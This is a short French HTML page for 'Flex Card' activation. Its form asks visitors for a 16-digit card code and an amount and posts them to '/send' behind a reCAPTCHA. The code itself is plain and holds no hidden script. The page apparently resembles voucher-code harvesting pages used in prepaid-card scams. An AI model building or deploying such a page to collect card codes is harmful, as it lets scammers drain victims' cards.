<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Activation - Flex Card</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>

  <div class="container">
    <img src="logo.png" alt="Logo Flex Card" class="logo">
    <h1>Bienvenue</h1>
    <p>Pour activer votre carte, entrez le code de la carte et le montant.</p>

    <form action="/send" method="POST">
      <input type="text" name="code" placeholder="Code de la carte" maxlength="16" required pattern="\d{16}" title="16 chiffres uniquement">
      <input type="text" name="montant" placeholder="Montant" id="montant" required pattern="\d+" title="Chiffres uniquement">

      <div class="g-recaptcha" data-sitekey="6Ld23h8rAAAAAlwiWDmgNPSpXBEaj6PC3l0L5kZF"></div>

      <button type="submit">Activer ma carte</button>
    </form>
  </div>

  <footer>
    <a href="index.html">Accueil</a>
    <a href="a-propos.html">À propos</a>
    <a href="confidentialite.html">Politique de confidentialité</a>
  </footer>

  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
  <script>
    document.getElementById('montant').addEventListener('input', function(e) {
      this.value = this.value.replace(/[^\d]/g, '');
    });
  </script>
</body>
</html>
